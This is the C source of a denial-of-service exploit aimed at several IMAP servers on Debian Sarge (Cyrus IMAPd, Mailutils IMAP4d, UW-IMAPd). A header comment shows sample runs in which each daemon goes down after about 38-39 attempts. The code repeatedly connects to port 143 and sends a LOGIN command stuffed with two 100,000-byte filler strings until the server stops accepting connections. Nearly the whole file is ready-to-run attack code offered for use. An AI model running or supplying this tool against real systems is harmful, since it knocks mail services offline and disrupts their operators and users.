/*

Debian Sarge Multiple IMAP Server DoS (debianimapers.c)
Jeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]

Testing Cyrus IMAPd:

bash$ ./debianimapers 192.168.0.189

.....

39 tries and imapd goes down! Mission Complete!

Testing Mailutil's IMAP4d:

bash$ ./debianimapers 192.168.0.189

.....

38 tries and imapd goes down! Mission Complete!

Testing UW-IMAPd:

bash$ ./debianimapers 192.168.0.189

.....

39 tries and imapd goes down! Mission Complete!

bash$

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define COUNT 100
#define SIZE  100000

char imaplogin[]  = "A0001 LOGIN";

int main(int argc, char *argv[])
{

    char buffer[SIZE], imapped[SIZE+30];
    int i, port = 143;

    memset(buffer, 0x41, sizeof(buffer));
    memset(imapped, 0, sizeof(imapped));

    snprintf(imapped, sizeof(imapped)-1, "%s %s %s\r\n\r\n", imaplogin, buffer, buffer);
    
if(argc < 2)
{

     printf("\nDebian Sarge Multiple IMAP Server DoS");
     printf("\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]\n");

     printf("\nUsage %s <host>\n\n", argv[0]);

return 0;
}

     printf("\nDebian Sarge Multiple IMAP Server DoS");
     printf("\nJeremy Brown [0xjbrown41@gmail.com/http://jbrownsec.blogspot.com]\n");

     int sock;
     struct sockaddr_in remote;

     remote.sin_family = AF_INET;
     remote.sin_port = htons(port);
     remote.sin_addr.s_addr = inet_addr(argv[1]);

if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { printf("Error: socket()\n"); return -1; }
if(connect(sock,(struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) { printf("Error: connect(%s:%d)\n", argv[1], port); return -1; }

     close(sock);

     printf("\nUsually takes ~1-2 minutes, LAN/Internet and connection speed will make time vary...\n");

for(i = 0; i <= COUNT; i++)
{

     struct sockaddr_in remote;
     remote.sin_family = AF_INET;
     remote.sin_port = htons(port);
     remote.sin_addr.s_addr = inet_addr(argv[1]);

if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { printf("Error: socket()\n"); return -1; }

sleep(1);

if(connect(sock,(struct sockaddr *)&remote, sizeof(struct sockaddr)) < 0) { printf("\n%d tries and imapd goes down! Mission Complete!\n\n", i); return -1; }

     int len = sizeof(imapped);
     send(sock, imapped, len, 0);
     close(sock);

}

return 0;
}
